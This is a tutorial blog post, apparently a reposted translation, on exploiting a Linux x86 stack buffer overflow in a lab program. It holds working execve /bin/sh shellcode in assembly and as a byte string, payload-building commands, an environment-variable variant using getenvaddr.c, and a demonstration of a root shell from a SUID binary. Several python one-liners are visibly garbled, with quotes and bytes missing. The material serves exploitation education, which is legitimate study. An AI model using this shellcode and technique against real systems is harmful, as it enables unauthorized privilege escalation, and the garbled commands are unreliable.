原文 by [gbmaster](https://gbmaster.wordpress.com)  

The next step in the exploitation is to spawn a shell by writing a shellcode that does it and using it to exploit a buffer overflow vulnerability. To do this it is necessary to use the execve system call exported by the Linux kernel: the function is listed in the unistd.h file and it is associated to the number 11. This function transfers the execution flow to the program specified in the arguments and, unless an error during the initialization happens, never returns to the caller. The parameters required by this system call are the following:  

* Pathname of the executable in EBX
* Address of the argv vector in ECX
* Address of the envp vector in EDX (it will be NULL here)

So, a sketch of the shellcode could be the following:
``` asm
 section .data

sh_str         db '/bin/sh'
null_ptr       db 0

section .text

global _start

_start:
        mov     eax, 11        ; execve system call number
        mov     ebx, sh_str    ; address of the pathname

        push    0              ; argv[1]
        push    sh_str         ; argv[0]

        mov     ecx, esp       ; pointer to the argv vector
        xor     edx, edx       ; NULL envp
        int     0x80           ; execute execve

        mov     al, 1          ; set up an exit call, just in case
        xor     ebx, ebx
        int     0x80           ; exit(0)
```
This code spawns a shell and passes no arguments to the function itself. Objdump, please:  
```
 $ objdump -d payload -M intel

shellcode:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:       b8 0b 00 00 00          mov    eax,0xb
 8048085:       bb a0 90 04 08          mov    ebx,0x80490a0
 804808a:       6a 00                   push   0x0
 804808c:       68 a0 90 04 08          push   0x80490a0
 8048091:       89 e1                   mov    ecx,esp
 8048093:       31 d2                   xor    edx,edx
 8048095:       cd 80                   int    0x80
 8048097:       b0 01                   mov    al,0x1
 8048099:       31 db                   xor    ebx,ebx
 804809b:       cd 80                   int    0x80
```
Then again, we’ll have to remove all the null bytes and the references to variables in the data section. Also there’s the 0x0b byte (ASCII for vertical tab) which is interpreted as a separator by scanf (with these functions, it is better to avoid 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x1A and 0x20). Anyway, I decided to get rid of the references to the string in a funny way, this time, just to learn a new technique. The string “/bin//sh” actually has the same effect of “/bin/sh” and this is perfectly testable in a Linux console. Why doing this? Because the length “/bin//sh” is a multiple of 4 and we can put this string (in reversed form) in the stack by using push instructions and, then, retrieving the address through the ESP register. I know this is a little bit confusing, but probably seeing the code would be more clear:  
``` asm
 global _start

_start:
	sub     esp, 0x7F

	xor     eax, eax       ; EAX = 0

	push    eax            ; argv[1] = 0
	push    0x68732f2f     ; "hs//"
	push    0x6e69622f     ; "nib/"
        mov     ebx, esp       ; address of the pathname

	push    eax
        mov     edx, esp       ; NULL envp

	push    ebx
        mov     ecx, esp       ; pointer to the argv vector

	add     al, 5
	add     al, 6          ; EAX = 11

        int     0x80           ; execute execve

        mov     al, 1
        xor     ebx, ebx
        int     0x80
```
So, the shellcode is NULL-free and doesn’t have references to anything outside the text section. Why the SUB instruction at the beginning? Well, it’s more for security reasons: you should not forget that **the shellcode goes into the stack and we’re executing a lot of PUSH instructions here**. This means that **one of these PUSH instructions might overwrite the shellcode itself** (believe me, it happens). Anyway, the final result can be checked with objdump, again:  
```

 $ objdump -d shellcode -M intel

shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       83 ec 7f                sub    esp,0x7f
 8048063:       31 c0                   xor    eax,eax
 8048065:       50                      push   eax
 8048066:       68 2f 2f 73 68          push   0x68732f2f
 804806b:       68 2f 62 69 6e          push   0x6e69622f
 8048070:       89 e3                   mov    ebx,esp
 8048072:       50                      push   eax
 8048073:       89 e2                   mov    edx,esp
 8048075:       53                      push   ebx
 8048076:       89 e1                   mov    ecx,esp
 8048078:       04 05                   add    al,0x5
 804807a:       04 06                   add    al,0x6
 804807c:       cd 80                   int    0x80
 804807e:       b0 01                   mov    al,0x1
 8048080:       31 db                   xor    ebx,ebx
 8048082:       cd 80                   int    0x80
```
So, by repeating the procedure already seen in the previous post, it is possible to complete the payload. First step: identifying the byte sequence of the shellcode.  
```
“\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80”
```

It’s time to write it into a file that will be used as input of the program:  
```
 $ python -c 'import sys; sys.stdout.write("\x90"*(64-36xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80")' > payload
```
Second step: appending a dummy value for the EBP  
```
 $ python -c 'import sys; sys.stdout.write("BBBB> payload
```
Third step: adding the address of the password variable (and we already know that, by the previous post):  
```
 $ python -c 'import sys; sys.stdout.write("\x70\xd2\xff\xff> payload
```
Fourth step: test it, just like we did before!  
```
 $ echo $$
23315
$ ./example1 < payload
$ echo $$
23315
```
Same process ID. Mmm… This means it **didn’t work**, but why? If I test the shellcode by itself it works, so why shouldn’t it work when used as input of the program? Well, this has more to do with the program itself than with the shellcode. In fact, the scanf function I used to retrieve the console input flushes stdin in such a way that /bin/sh receives an EOF and quits. But this makes everything we did USELESS. Hell! No worries, as it is possible to rearrange it in a slightly different way:  
```
 $ echo $$
23315
$ ( cat payload; cat ) | ./example1

echo $$
20868
whoami
user
ls
example1  example1.c  exploit  payload  shellcode  shellcode.asm  shellcode.o
```
Even if we don’t have shell prompt (as the stdin of the shell is not connected to a terminal, sh acts like it is not running in interactive mode), the shell has been spawned and actually replies to commands.  

That’s it!  

A worthful modification to the example1 source code is shortening the password array size from 64 to 10: in this way there’s not enough space to host the shellcode we designed. We need now 10+4+4 bytes to overflow the buffer, overwrite the saved EBP value and overwrite the return address. By attaching gdb to the running example1 process (just like in the previous post), I found out that now the password buffer is located at 0xFFFFD296. The way the following acts relies on the environment variables, as, in Linux, every program stores them on the stack: we can create one storing the shellcode and then jump there in a similar way saw before.  

Yes, yes, this is all doable, but we need to know the address where a given environment variable will be located when a program is loaded. To do this, there’s a nice piece of code taken from the wonderful book “Hacking: The Art of Exploitation, 2nd Edition“, called getenvaddr.c:  
``` c

 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char *ptr;
    if(argc < 3)
    {
        printf("Usage: %s  \n", argv[0]);
        return 0;
    }

    ptr = getenv(argv[1]); /* Get env var location. */
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* Adjust for program name. */
    printf("%s will be at %p\n", argv[1], ptr);

    return 0;
}
```
So, getenvaddr accepts as arguments the environment variable we’re interested into and the program name we’re going to exploit. So, first thing first: we need to write the exploit into the environment variable. Obviously, the exploit we had still rocks:  
```
 $ export SHELLCODE=`python -c 'import sys; sys.stdout.write("\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80
```
Now that the environment variable is set, it is possible to use the getenvaddr program:  
```

 $ ./getenvaddr SHELLCODE ./example1
SHELLCODE will be at 0xffffd522
```
Cool, we have our address. Now it is definitely easy to exploit the vulnerability, as the overwriting of the return address must be this value: 0xFFFFD522.  
```
 $ echo $$
23315
$ ( python -c 'import sys; sys.stdout.write("A"*14d5\xff\xff")'; cat ) | ./example1

echo $$
27609
whoami
user
ls
example1  example1.c  exploit  getenvaddr  getenvaddr.c  payload  shellcode  shellcode.asm  shellcode.o
```
That’s it!  

Now let’s say that example1 has SUID rights (it gives the permissions to the user to run the executable with the owner’s rights) and that the owner is root. This scenario can be created with the following commands:  
```
 # chown root:root example1
# chmod 4755 example1
# exit
$
```
Let’s try again the same exploit of before and let’s see what happens:  
```
 $ echo $$
23315
$ ( python -c 'import sys; sys.stdout.write("A"*14d5\xff\xff")'; cat ) | ./example1

echo $$
27609
whoami
root
```
We gained a root shell. That’s why SUID rights must be treated with extreme care, as, if there are vulnerabilities in the code, these might allow the attacker to execute shellcode with root privileges.  

Writing this article was extremely funny, as I had to face some issues I never thought to (i.e. the magical SUB instruction at the beginning of the shell spawning shellcode and the stdin stuff after the shellcode execution). I think that in these things **fun is everything**, and most of the times **losing is fun**.  